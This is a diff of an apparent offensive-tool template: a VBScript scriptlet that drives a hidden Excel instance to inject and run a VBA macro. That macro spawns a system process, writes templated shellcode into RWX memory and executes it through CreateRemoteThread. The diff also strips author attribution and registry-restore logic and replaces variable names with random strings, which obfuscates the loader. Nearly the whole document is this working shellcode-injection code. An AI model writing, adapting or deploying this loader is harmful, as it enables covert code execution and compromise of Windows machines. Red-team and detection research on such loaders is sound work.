@@ -26,12 +26,10 @@ data:	<?XML version="1.0"?>
 		<registration 
 		    progid="newTest"
 		    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
-			<!-- Proof Of Concept - Casey Smith @subTee -->
-			<!--  License: BSD3-Clause -->
 			<script language="VBScript">
 				<![CDATA[	
 					Function Register
-						MsgBox " - Windows Script Component registered."
+						MsgBox ""
 					End Function
 				]]>
 			</script>
@@ -39,136 +37,108 @@ data:	<?XML version="1.0"?>
 
 		<public>
 			<method name="Test"></method>
-			<method name="RegExists">
-				<parameter name="regKey"/>
-			</method>
 		</public>
 
 		<script language="VBScript">
 			<![CDATA[	
 
 			Function Test()
-
-					Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
-
-		Set objExcel = CreateObject("Excel.Application")
-		objExcel.Visible = False
-
-		Set WshShell = CreateObject("Wscript.Shell")
-
-		' Get the old AccessVBOM value
-		RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"
-
-		if RegExists(RegPath) then
-			action = WshShell.RegRead(RegPath)
-		else
-			action = ""
-		end if
-
-		' Weaken the target
-		WshShell.RegWrite RegPath, 1, "REG_DWORD"
-
-		' Run the macro
-		Set objWorkbook = objExcel.Workbooks.Add()
-		Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
-		xlmodule.CodeModule.AddFromString ${Processing:value}
-		objExcel.DisplayAlerts = False
-		on error resume next
-		objExcel.Run "Auto_Open"
-		objWorkbook.Close False
-		objExcel.Quit
-
-		' Restore the registry to its old state
-		if action = "" then
-			WshShell.RegDelete RegPath
-		else
-			WshShell.RegWrite RegPath, action, "REG_DWORD"
-		end if
+				Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
+				
+				Set objExcel = CreateObject("Excel.Application")
+				objExcel.Visible = False
 			
+				Application_Version = objExcel.Version	
+				Set WshShell = CreateObject("Wscript.Shell")
+				
+				strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application_Version & "\Excel\Security\AccessVBOM"
+			
+				Set objWorkbook = objExcel.Workbooks.Add()
+				Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
+				strCode = ${Processing:value}
+				xlmodule.CodeModule.AddFromString strCode
+				objExcel.DisplayAlerts = False
+				objExcel.Run "Auto_Open"
+				objWorkbook.Close False
+				objExcel.Quit
 			End Function
 			
-			Function RegExists(regKey)
-				on error resume next
-				WshShell.RegRead regKey
-				RegExists = (Err.number = 0)
-			End function
 			]]>
 		</script>
 		</scriptlet>
 
 [Processing]
 value: Private Type PROCESS_INFORMATION
-	    hProcess As Long
-	    hThread As Long
-	    dwProcessId As Long
-	    dwThreadId As Long
-	End Type
+		    hProcess As Long
+		    hThread As Long
+		    dwProcessId As Long
+		    dwThreadId As Long
+		End Type
 
-	Private Type STARTUPINFO
-	    cb As Long
-	    lpReserved As String
-	    lpDesktop As String
-	    lpTitle As String
-	    dwX As Long
-	    dwY As Long
-	    dwXSize As Long
-	    dwYSize As Long
-	    dwXCountChars As Long
-	    dwYCountChars As Long
-	    dwFillAttribute As Long
-	    dwFlags As Long
-	    wShowWindow As Integer
-	    cbReserved2 As Integer
-	    lpReserved2 As Long
-	    hStdInput As Long
-	    hStdOutput As Long
-	    hStdError As Long
-	End Type
+		Private Type STARTUPINFO
+		    cb As Long
+		    lpReserved As String
+		    lpDesktop As String
+		    lpTitle As String
+		    dwX As Long
+		    dwY As Long
+		    dwXSize As Long
+		    dwYSize As Long
+		    dwXCountChars As Long
+		    dwYCountChars As Long
+		    dwFillAttribute As Long
+		    dwFlags As Long
+		    wShowWindow As Integer
+		    cbReserved2 As Integer
+		    lpReserved2 As Long
+		    hStdInput As Long
+		    hStdOutput As Long
+		    hStdError As Long
+		End Type
 
-	#If VBA7 Then
-	    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
-	    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
-	    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
-	    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+	#If Vba7 Then
+		Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal Lujkda As Long, ByVal Dtzxcng As Long, ByVal Yioyj As Long, ByVal Yfjycwjg As LongPtr, Kinxmvupb As Long, ByVal Ggi As Long, Klknqy As Long) As LongPtr
+		Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal Ghnpli As Long, ByVal Euqqh As Long, ByVal Ggwfz As Long, ByVal Ctewr As Long, ByVal Nws As Long) As LongPtr
+		Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal Rxzgi As Long, ByVal Yuugx As LongPtr, ByRef Ussxg As Any, ByVal Ljiha As Long, ByVal Kplos As LongPtr) As LongPtr
+		Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal Ilopa As String, ByVal Apvbbs As String, Oulgxza As Any, Iuldf As Any, ByVal Wulaxn As Long, ByVal Bcdlpia As Long, Yulimz As Any, ByVal Qjilvf As String, Jmexuiz As STARTUPINFO, Lixsuin As PROCESS_INFORMATION) As Long
 	#Else
-	    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
-	    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
-	    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
-	    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
-	#End If
+		Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal Lujkda As Long, ByVal Dtzxcng As Long, ByVal Yioyj As Long, ByVal Yfjycwjg As LongPtr, Kinxmvupb As Long, ByVal Ggi As Long, Klknqy As Long) As LongPtr
+		Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal Ghnpli As Long, ByVal Euqqh As Long, ByVal Ggwfz As Long, ByVal Ctewr As Long, ByVal Nws As Long) As LongPtr
+		Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal Rxzgi As Long, ByVal Yuugx As LongPtr, ByRef Ussxg As Any, ByVal Ljiha As Long, ByVal Kplos As LongPtr) As LongPtr
+		Private Declare Function CreateProcessA Lib "kernel32" (ByVal Ilopa As String, ByVal Apvbbs As String, Oulgxza As Any, Iuldf As Any, ByVal Wulaxn As Long, ByVal Bcdlpia As Long, Yulimz As Any, ByVal Qjilvf As String, Jmexuiz As STARTUPINFO, Lixsuin As PROCESS_INFORMATION) As Long
+	#EndIf
 
 	Sub Auto_Open()
-	    Dim myByte As Long, myArray As Variant, offset As Long
-	    Dim pInfo As PROCESS_INFORMATION
-	    Dim sInfo As STARTUPINFO
-	    Dim sNull As String
-	    Dim sProc As String
-
-	#If VBA7 Then
-	    Dim rwxpage As LongPtr, res As LongPtr
+		Dim Nmpila As PROCESS_INFORMATION
+		Dim Ilmpo As STARTUPINFO
+		Dim Ulnma As String
+		Dim Kox As Long, Dbrfrvj As Variant, Kycfoqoc As Long
+	#If Vba7 Then
+		Dim  Coefj As LongPtr, Bmqfu As LongPtr
 	#Else
-	    Dim rwxpage As Long, res As Long
-	#End If
-	    myArray = ${ShellCode:value}
-	    If Len(Environ("ProgramW6432")) > 0 Then
-		sProc = Environ("windir") & "\\SysWOW64\\${Processx64:value}"
-	    Else
-		sProc = Environ("windir") & "\\System32\\${Processx86:value}"
-	    End If
+		Dim  Coefj As Long, Bmqfu As Long
+	#EndIf
+		Dbrfrvj = ${ShellCode:value}
 
-	    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
+		If Len(Environ("ProgramW6432")) > 0 Then
+		    Excda = Environ("windir") & "\\SysWOW64\\${Processx64:value}"
+		else
+		    Excda = Environ("windir") & "\\System32\\${Processx86:value}"
+		End If
 
-	    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
-	    For offset = LBound(myArray) To UBound(myArray)
-		myByte = myArray(offset)
-		res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
-	    Next offset
-	    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
+		Bmqfu = CreateProcessA(Ulnma, Excda, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, Ulnma, Ilmpo, Nmpila)
+		Coefj = VirtualAllocEx(Nmpila.hProcess, 0, UBound(Dbrfrvj), &H1000, &H40)
+		For Kycfoqoc = LBound(Dbrfrvj) To UBound(Dbrfrvj)
+			Kox = Dbrfrvj(Kycfoqoc)
+			Bmqfu = WriteProcessMemory(Nmpila.hProcess, Coefj + Kycfoqoc, Kox, 1, ByVal 0&)
+		Next Kycfoqoc
+		Bmqfu = CreateRemoteThread(Nmpila.hProcess, 0, 0, Coefj, 0, 0, 0)
 	End Sub
 	Sub AutoOpen()
-	    Auto_Open
+		Auto_Open
 	End Sub
 	Sub Workbook_Open()
-	    Auto_Open
+		Auto_Open
 	End Sub
 process: chrEncode
+
